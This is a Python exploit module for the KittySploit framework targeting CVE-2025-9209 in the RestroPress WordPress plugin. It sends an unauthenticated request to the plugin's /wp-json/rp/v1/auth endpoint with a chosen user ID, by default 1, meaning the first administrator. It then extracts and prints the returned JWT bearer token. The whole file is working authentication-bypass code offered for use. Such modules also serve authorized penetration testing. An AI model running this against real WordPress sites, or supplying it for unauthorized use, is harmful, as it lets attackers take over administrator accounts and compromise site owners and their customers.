#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RestroPress CVE-2025-9209 — obtain forged JWT for arbitrary user id."""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "RestroPress CVE-2025-9209 JWT token",
        "description": (
            "Auxiliary for CVE-2025-9209: fetches a RestroPress JWT for the given user_id "
            "without authentication. Outputs bearer token only (no WordPress cookie session)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-9209"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-9209"],
        "tags": ["wordpress", "restropress", "jwt", "auth-bypass", "auxiliary", "cve-2025-9209"],
        "agent": {
            "risk": "high",
            "effects": ["credential_access"],
            "approval_required": True,
            "produces": ["credentials"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "WordPress user ID (1 = first admin)", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        uid = int(self.user_id or 1)
        response = self.http_request(
            method="GET",
            path=self._join("/wp-json/rp/v1/auth"),
            params={"user_id": str(uid)},
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            print_error("JWT endpoint failed")
            return False
        body = response.text or ""
        match = re.search(r'"token"\s*:\s*"(eyJ[^"]+)"', body)
        if not match:
            print_error("No JWT in response")
            return False
        token = match.group(1)
        print_success(f"JWT for user_id={uid}")
        print_status(token[:120] + ("..." if len(token) > 120 else ""))
        try:
            payload = json.loads(body)
            if payload.get("user"):
                print_status(f"User hint: {payload.get('user')}")
        except json.JSONDecodeError:
            pass
        return True
